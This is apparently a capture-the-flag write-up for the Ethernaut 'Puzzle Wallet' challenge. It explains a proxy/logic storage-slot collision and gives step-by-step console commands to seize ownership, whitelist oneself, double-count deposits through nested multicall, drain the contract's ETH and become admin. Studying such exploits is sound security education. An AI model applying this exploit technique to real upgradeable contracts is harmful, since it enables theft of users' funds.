# Puzzle Wallet

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help::

Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.

Recommend watch youtube [Multi Delegatecall | Solidity 0.8](https://youtu.be/NkTWU6tc9WU)
for understand muticall concept, the example code from that youtube in [example.sol](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/example.sol)

### Description
In an easy word, _Proxy_ and _Logic_ contracts share storage via `delegatecall`, that means `pendingAdmin` is `owner` as well as `admin` is `maxBalance`.

| Slot | Variable           |
|------|--------------------|
| 0    | pendingAdmin/owner |
| 1    | admin/maxBalance   |
| 2    | whitelisted        |
| 3    | balances           |

In this sense, you can guess that `admin` can be set to a new value via `maxBalance`.
In order to set `maxBalance`, you have to be whitelisted as well as the wallet contract's ether balance has to be 0.
In order to add someone in whiltelist, you have to be `owner`.
In order to be `owner`, you can set `pendingAdmin` as yourself through `proposeNewAdmin` in `PuzzleProxy`.
Once you are whiltelisted, you can call `execute` and `multicall` strategically to steal ethers from the wallet contract.

### Step by step

1. Propose yourself as a new owner
2. Add yourself in whitelist
3. Manipulate your balance
4. Drain out ETH
   - `multicall([deposit, multicall([deposit])])`
   - `execute(yourself)`
5. Set `maxBalance` to be a new admin

Credit: idea about step by step is from [maAPPsDEV/puzzle-wallet-attack](https://github.com/maAPPsDEV/puzzle-wallet-attack)

## Test in console
```shell
contract.abi
(10) [{…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}]0: {inputs: Array(1), name: 'addToWhitelist', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}1: {inputs: Array(1), name: 'balances', outputs: Array(1), stateMutability: 'view', type: 'function', …}2: {inputs: Array(0), name: 'deposit', outputs: Array(0), stateMutability: 'payable', type: 'function', …}3: {inputs: Array(3), name: 'execute', outputs: Array(0), stateMutability: 'payable', type: 'function', …}4: {inputs: Array(1), name: 'init', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}5: {inputs: Array(0), name: 'maxBalance', outputs: Array(1), stateMutability: 'view', type: 'function', …}6: {inputs: Array(1), name: 'multicall', outputs: Array(0), stateMutability: 'payable', type: 'function', …}7: {inputs: Array(0), name: 'owner', outputs: Array(1), stateMutability: 'view', type: 'function', …}8: {inputs: Array(1), name: 'setMaxBalance', outputs: Array(0), stateMutability: 'nonpayable', type: 'function', …}9: {inputs: Array(1), name: 'whitelisted', outputs: Array(1), stateMutability: 'view', type: 'function', …}length: 10[[Prototype]]: Array(0)
```
```shell
contract.address
'0xdcde1dfC141EE526afE58C48be75835565806f7C'
```

```shell
await contract.owner();
'0xe13a4a46C346154C41360AAe7f070943F67743c9'
```

from contract.abi, it means we interact directly with PuzzleWallet contract not PuzzleProxy.
it cannot directly call the function `proposeNewAdmin` inside PuzzleProxy. Solve by using Remix to load your ABI PuzzleProxy into the address of the instance, or call it via function signature.

### Method1: call function signature and send transaction via console

function signature of the functionproposeNewAdmin:
```shell
web3.eth.abi.encodeFunctionSignature("proposeNewAdmin(address)");
> '0xa6376746'
```
encode parameter:
```shell
web3.eth.abi.encodeParameter("address", player);
> '0x000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942'
```
Called data will be signature + encoded parameters:
```shell
contract.sendTransaction({ data: '0xa6376746000000000000000000000000c3a005e15cb35689380d9c1318e981bca9339942' });
```

### Method 2 using remix to load your ABI PuzzleProxy into the address of the instance
see solution in [test.js](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/test.js)
In this file, we use Alchemy web3 plugin to interact with metamask when send the raw transaction to contract.

![run](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/photo/run.JPG)

Transaction in Alchemy mempool from web3 transaction to interact with proposeNewAdmin(player)

![run2](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/photo/run2.JPG)

Verify result that you are the new owner:
```shell
await contract.owner();
```

Add yourself into whitelist:
```shell
await contract.addToWhitelist(player);
```

Verify result that player address in whitelist:
```shell
await contract.whitelisted(player);
```

Result on console:

![console](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/photo/result1.JPG)

Step3 - Step5 see solution in file [delegate.js](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/delegate.js)

![complete](https://github.com/Thanasornsawan/ethernaut-writeup/blob/main/Puzzle%20Wallet/photo/complete.JPG)